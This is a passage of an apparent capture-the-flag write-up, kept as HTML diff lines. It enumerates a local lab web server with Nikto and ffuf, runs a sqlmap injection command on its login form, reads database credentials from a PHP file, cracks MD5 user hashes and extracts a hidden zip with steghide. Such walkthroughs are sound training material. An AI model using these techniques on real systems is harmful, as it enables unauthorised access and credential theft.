+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h2>
+
+<h3 id="nikto-1" class="heading">Nikto <a href="#nikto-1" aria-labelledby="nikto-1">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h3>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(root💀kali)-[/home/tiago]
+</span></span><span class="line"><span class="cl">└─# nikto -h http://localhost:9001
+</span></span><span class="line"><span class="cl">- Nikto v2.1.6
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Target IP:          127.0.0.1
+</span></span><span class="line"><span class="cl">+ Target Hostname:    localhost
+</span></span><span class="line"><span class="cl">+ Target Port:        9001
+</span></span><span class="line"><span class="cl">+ Message:            Multiple IP addresses found: 127.0.0.1, 127.0.0.1
+</span></span><span class="line"><span class="cl">+ Start Time:         2020-12-18 21:42:32 (GMT-3)
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Server: Apache/2.4.29 (Ubuntu)
+</span></span><span class="line"><span class="cl">+ The anti-clickjacking X-Frame-Options header is not present.
+</span></span><span class="line"><span class="cl">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+</span></span><span class="line"><span class="cl">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+</span></span><span class="line"><span class="cl">+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)
+</span></span><span class="line"><span class="cl">+ IP address found in the &#39;location&#39; header. The IP is &#34;127.0.1.1&#34;.
+</span></span><span class="line"><span class="cl">+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is &#34;127.0.1.1&#34;.
+</span></span><span class="line"><span class="cl">+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+</span></span><span class="line"><span class="cl">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+</span></span><span class="line"><span class="cl">+ OSVDB-561: /server-status: This reveals Apache information. Comment out appropriate line in the Apache conf file or restrict access to allowed sources.
+</span></span><span class="line"><span class="cl">+ OSVDB-3268: /images/: Directory indexing found.
+</span></span><span class="line"><span class="cl">+ OSVDB-3233: /icons/README: Apache default file found.
+</span></span><span class="line"><span class="cl">+ 7683 requests: 0 error(s) and 10 item(s) reported on remote host
+</span></span><span class="line"><span class="cl">+ End Time:           2020-12-18 21:43:56 (GMT-3) (84 seconds)
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ 1 host(s) tested</span></span></code></pre></div></div>
+<h3 id="ffuf" class="heading">ffuf <a href="#ffuf" aria-labelledby="ffuf">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h3>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># ./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://localhost:9001/FUZZ </span></span></code></pre></div></div><p>Fuzz files with extension .php</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">💀</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">tiago</span><span class="o">/</span><span class="n">apps</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">ffuf_1</span><span class="o">.</span><span class="mf">1.0</span><span class="n">_linux_amd64</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="c1"># ./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://localhost:9001/FUZZ.php                                                                             </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="o">/</span><span class="s1">&#39;___\  /&#39;</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">&#39;___\       </span>
+</span></span><span class="line"><span class="cl">       <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span> <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>  <span class="n">__</span>  <span class="n">__</span>  <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>       
+</span></span><span class="line"><span class="cl">       \ \ <span class="p">,</span><span class="n">__</span>\\ \ <span class="p">,</span><span class="n">__</span>\<span class="o">/</span>\ \<span class="o">/</span>\ \ \ \ <span class="p">,</span><span class="n">__</span>\      
+</span></span><span class="line"><span class="cl">        \ \ \<span class="n">_</span><span class="o">/</span> \ \ \<span class="n">_</span><span class="o">/</span>\ \ \<span class="n">_</span>\ \ \ \ \<span class="n">_</span><span class="o">/</span>      
+</span></span><span class="line"><span class="cl">         \ \<span class="n">_</span>\   \ \<span class="n">_</span>\  \ \<span class="n">____</span><span class="o">/</span>  \ \<span class="n">_</span>\       
+</span></span><span class="line"><span class="cl">          \<span class="o">/</span><span class="n">_</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="o">/</span><span class="n">___</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>       
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       <span class="n">v1</span><span class="o">.</span><span class="mf">1.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">________________________________________________</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="p">::</span> <span class="n">Method</span>           <span class="p">:</span> <span class="n">GET</span>
+</span></span><span class="line"><span class="cl"> <span class="p">::</span> <span class="n">URL</span>              <span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">9001</span><span class="o">/</span><span class="n">FUZZ</span><span class="o">.</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"> <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirb</span><span class="o">/</span><span class="n">big</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"> <span class="p">::</span> <span class="n">Follow</span> <span class="n">redirects</span> <span class="p">:</span> <span class="bp">false</span>
+</span></span><span class="line"><span class="cl"> <span class="p">::</span> <span class="n">Calibration</span>      <span class="p">:</span> <span class="bp">false</span>
+</span></span><span class="line"><span class="cl"> <span class="p">::</span> <span class="n">Timeout</span>          <span class="p">:</span> <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"> <span class="p">::</span> <span class="n">Threads</span>          <span class="p">:</span> <span class="mi">40</span>
+</span></span><span class="line"><span class="cl"> <span class="p">::</span> <span class="n">Matcher</span>          <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">301</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="mi">307</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">403</span>
+</span></span><span class="line"><span class="cl"><span class="n">________________________________________________</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">htaccess</span>               <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">276</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">20</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">htpasswd</span>               <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">276</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">20</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">account</span>                 <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">hacker</span>                  <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">453</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">26</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">26</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">index</span>                   <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">572</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">49</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">19</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">::</span> <span class="n">Progress</span><span class="p">:</span> <span class="p">[</span><span class="mi">20469</span><span class="o">/</span><span class="mi">20469</span><span class="p">]</span> <span class="p">::</span> <span class="n">Job</span> <span class="p">[</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="p">]</span> <span class="p">::</span> <span class="mi">4093</span> <span class="n">req</span><span class="o">/</span><span class="n">sec</span> <span class="p">::</span> <span class="n">Duration</span><span class="p">:</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">05</span><span class="p">]</span> <span class="p">::</span> <span class="n">Errors</span><span class="p">:</span> <span class="mi">0</span> <span class="p">::</span></span></span></code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_2016,w_2800/v1608376758/blog/image-20201218214214025_i1nss3.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_415,w_576/v1608376758/blog/image-20201218214214025_i1nss3.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_553,w_768/v1608376758/blog/image-20201218214214025_i1nss3.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_714,w_992/v1608376758/blog/image-20201218214214025_i1nss3.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_864,w_1200/v1608376758/blog/image-20201218214214025_i1nss3.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_1008,w_1400/v1608376758/blog/image-20201218214214025_i1nss3.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_2016,w_2800/v1608376758/blog/image-20201218214214025_i1nss3.png 2800w" sizes="100vw"
+            height="2016"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+<p>The login page  was also vulnerable to SQL Injection, but it was not necessary.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u http://localhost:9001 --data=&#34;username=admin&amp;password=admin&amp;submit=Submit&#34; --dbs</span></span></code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_968,w_2800/v1608376756/blog/image-20201218223211426_ultssh.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_199,w_576/v1608376756/blog/image-20201218223211426_ultssh.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_265,w_768/v1608376756/blog/image-20201218223211426_ultssh.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_343,w_992/v1608376756/blog/image-20201218223211426_ultssh.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_415,w_1200/v1608376756/blog/image-20201218223211426_ultssh.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_484,w_1400/v1608376756/blog/image-20201218223211426_ultssh.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_968,w_2800/v1608376756/blog/image-20201218223211426_ultssh.png 2800w" sizes="100vw"
+            height="968"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+<p>Keep reading  files&hellip;</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">$</span> <span class="n">locate</span> <span class="n">hacker</span><span class="o">.</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="n">hacker</span><span class="o">.</span><span class="n">php</span></span></span></code></pre></div></div><div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">files</span><span class="o">$</span> <span class="n">ls</span>
+</span></span><span class="line"><span class="cl"><span class="n">ls</span>
+</span></span><span class="line"><span class="cl"><span class="n">account</span><span class="o">.</span><span class="n">php</span>  <span class="n">hacker</span><span class="o">.</span><span class="n">php</span>  <span class="n">images</span>  <span class="n">index</span><span class="o">.</span><span class="n">php</span>  <span class="n">style</span><span class="o">.</span><span class="n">css</span></span></span></code></pre></div></div><div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span></span></span></code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_2034,w_2800/v1608376755/blog/image-20201218215614910_jog0x4.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_418,w_576/v1608376755/blog/image-20201218215614910_jog0x4.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_558,w_768/v1608376755/blog/image-20201218215614910_jog0x4.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_721,w_992/v1608376755/blog/image-20201218215614910_jog0x4.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_872,w_1200/v1608376755/blog/image-20201218215614910_jog0x4.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_1017,w_1400/v1608376755/blog/image-20201218215614910_jog0x4.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_2034,w_2800/v1608376755/blog/image-20201218215614910_jog0x4.png 2800w" sizes="100vw"
+            height="2034"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl">		<span class="k">try</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$con</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s2">&#34;mysql:dbname=webportal;host=localhost&#34;</span><span class="p">,</span><span class="s2">&#34;root&#34;</span><span class="p">,</span><span class="s2">&#34;!@m+her00+@db&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$con</span><span class="o">-&gt;</span><span class="na">setAttribute</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_ERRMODE</span><span class="p">,</span><span class="nx">PDO</span><span class="o">::</span><span class="na">ERRMODE_WARNING</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span></span></span></code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_1728,w_2800/v1608376755/blog/image-20201218215808026_qi3i1x.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_356,w_576/v1608376755/blog/image-20201218215808026_qi3i1x.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_474,w_768/v1608376755/blog/image-20201218215808026_qi3i1x.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_612,w_992/v1608376755/blog/image-20201218215808026_qi3i1x.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_741,w_1200/v1608376755/blog/image-20201218215808026_qi3i1x.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_864,w_1400/v1608376755/blog/image-20201218215808026_qi3i1x.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_1728,w_2800/v1608376755/blog/image-20201218215808026_qi3i1x.png 2800w" sizes="100vw"
+            height="1728"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_1478,w_2800/v1608376755/blog/image-20201218220041891_xtlzqu.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_304,w_576/v1608376755/blog/image-20201218220041891_xtlzqu.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_405,w_768/v1608376755/blog/image-20201218220041891_xtlzqu.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_524,w_992/v1608376755/blog/image-20201218220041891_xtlzqu.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_633,w_1200/v1608376755/blog/image-20201218220041891_xtlzqu.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_739,w_1400/v1608376755/blog/image-20201218220041891_xtlzqu.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_1478,w_2800/v1608376755/blog/image-20201218220041891_xtlzqu.png 2800w" sizes="100vw"
+            height="1478"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+----+-----------+----------+-----------+----------------------------------+
+</span></span><span class="line"><span class="cl">| id | firstname | lastname | username  | password                         |
+</span></span><span class="line"><span class="cl">+----+-----------+----------+-----------+----------------------------------+
+</span></span><span class="line"><span class="cl">|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
+</span></span><span class="line"><span class="cl">|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+</span></span><span class="line"><span class="cl">+----+-----------+----------+-----------+----------------------------------+</span></span></code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_1537,w_2800/v1608376756/blog/image-20201218220630416_rbqkdt.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_316,w_576/v1608376756/blog/image-20201218220630416_rbqkdt.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_422,w_768/v1608376756/blog/image-20201218220630416_rbqkdt.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_545,w_992/v1608376756/blog/image-20201218220630416_rbqkdt.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_659,w_1200/v1608376756/blog/image-20201218220630416_rbqkdt.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_769,w_1400/v1608376756/blog/image-20201218220630416_rbqkdt.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_1537,w_2800/v1608376756/blog/image-20201218220630416_rbqkdt.png 2800w" sizes="100vw"
+            height="1537"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Hash</th>
+<th style="text-align:center">Type</th>
+<th style="text-align:center">Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">7e53614ced3640d5de23f111806cc4fd</td>
+<td style="text-align:center">md5</td>
+<td style="text-align:center">masterpassword</td>
+</tr>
+<tr>
+<td style="text-align:center">686216240e5af30df0501e53c789a649</td>
+<td style="text-align:center">md5</td>
+<td style="text-align:center">dontaskdonttell</td>
+</tr>
+</tbody>
+</table>
+<p>So far, I couldn&rsquo;t use any of MySQL information, so I&rsquo;ll keep looking further in the hacker.php 😑. There is something suspect there&hellip;🧐</p>
+<p>First thing I did was look at useful <code>strings</code> inside it background gif and hacker image, with no luck.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(root💀kali)-[~]
+</span></span><span class="line"><span class="cl">└─# strings hacker-with-laptop_23-2147985341.jpg</span></span></code></pre></div></div><p>😕</p>
+<p>Next thing I tried to check these images with steghide&hellip;got something new&hellip;</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(root💀kali)-[~]
+</span></span><span class="line"><span class="cl">└─# steghide extract -sf hacker-with-laptop_23-2147985341.jpg
+</span></span><span class="line"><span class="cl">Enter passphrase: 
+</span></span><span class="line"><span class="cl">wrote extracted data to &#34;backup.zip&#34;.</span></span></code></pre></div></div><p>No password was needed. =)</p>
+<p>Next, time to unzip <code>backup.zip</code> file, but none of last taken password could help me. =(</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_502,w_2800/v1608376756/blog/image-20201218224551509_bgu48h.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_103,w_576/v1608376756/blog/image-20201218224551509_bgu48h.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_138,w_768/v1608376756/blog/image-20201218224551509_bgu48h.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_178,w_992/v1608376756/blog/image-20201218224551509_bgu48h.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_215,w_1200/v1608376756/blog/image-20201218224551509_bgu48h.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_251,w_1400/v1608376756/blog/image-20201218224551509_bgu48h.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_502,w_2800/v1608376756/blog/image-20201218224551509_bgu48h.png 2800w" sizes="100vw"
+            height="502"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+<p>Why not try to crack it?</p>
+<p>First, get file hash to be cracked.</p>
